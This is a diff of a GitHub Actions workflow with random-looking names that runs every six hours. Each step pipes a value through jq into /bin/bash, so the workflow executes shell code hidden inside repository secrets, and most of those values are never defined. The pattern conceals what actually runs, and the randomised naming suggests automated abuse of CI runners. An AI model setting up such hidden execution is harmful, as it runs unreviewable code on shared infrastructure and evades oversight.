@@ -1,22 +1,24 @@
 name: huangtaozi6518
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '24 0/6 * * *'
+    - cron: '57 2/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: huangtaozi6518
         env:
-          rhrod6: ${{ secrets.rhrod6 }}
+          iecg4: ${{ secrets.iecg4 }}
         run: |
-          echo $rhrod6 | jq -r .g8327 | /bin/bash
-          echo $wcae74563 | jq -r .tfx7420 | /bin/bash
-          echo $auhj80 | jq -r .sm8 | /bin/bash
-          echo $dxlv31866 | jq -r .r780 | /bin/bash
-          echo $t3 | jq -r .cqgqj0435 | /bin/bash
+          echo $iecg4 | jq -r .wep008 | /bin/bash
+          echo $ffhs18 | jq -r .wlc1 | /bin/bash
+          echo $wtlhf07715 | jq -r .gpgmb1208 | /bin/bash
+          echo $cxn8494 | jq -r .lvl9 | /bin/bash
+          echo $pltui7 | jq -r .hgwr7085 | /bin/bash
+          echo $mkcm63709 | jq -r .jrch6183 | /bin/bash
+          echo $vymiy339 | jq -r .deaw34 | /bin/bash
+          echo $fjie65847 | jq -r .yvcst8708 | /bin/bash
 
